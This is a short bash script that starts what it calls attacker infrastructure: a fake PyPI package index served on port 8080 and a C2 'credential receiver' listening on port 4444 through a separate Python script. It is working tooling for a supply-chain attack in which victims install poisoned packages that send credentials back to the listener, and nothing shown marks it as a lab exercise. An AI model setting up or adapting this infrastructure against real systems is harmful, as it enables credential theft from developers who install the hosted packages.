#!/bin/bash
# Start Attacker Infrastructure (C2 + PyPI Server) as separate processes

set -e

# Parse optional IP argument
SERVER_IP="$1"

echo "=========================================="
echo "  Starting Attacker Infrastructure"
echo "=========================================="
echo ""

# Get script directory
DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
cd "$DIR"

# Create packages directory if it doesn't exist
mkdir -p packages/simple

if [ -n "$SERVER_IP" ]; then
    echo "[*] Using specified IP: $SERVER_IP"
else
    echo "[*] Auto-detecting network IP..."
    # Simple IP detection
    SERVER_IP=$(hostname -I | awk '{print $1}')
    echo "[*] Detected IP: $SERVER_IP"
fi

echo "[*] PyPI URL: http://$SERVER_IP:8080/simple/"
echo "[*] C2 Port: 4444"
echo ""

# Start PyPI server in background
echo "[*] Starting PyPI server on port 8080..."
cd packages
python3 -m http.server 8080 --bind 0.0.0.0 > /dev/null 2>&1 &
PYPI_PID=$!
cd "$DIR"
echo "[+] PyPI server started (PID: $PYPI_PID)"

# Give PyPI server time to start
sleep 1

# Start C2 listener in foreground
echo "[*] Starting C2 credential receiver on port 4444..."
echo "[*] Press Ctrl+C to stop both servers"
echo ""

# Trap to kill PyPI server when C2 is stopped
trap "echo ''; echo '[*] Stopping PyPI server...'; kill $PYPI_PID 2>/dev/null; echo '[*] Servers stopped'; exit" INT TERM

# Run standalone C2
python3 c2_only.py
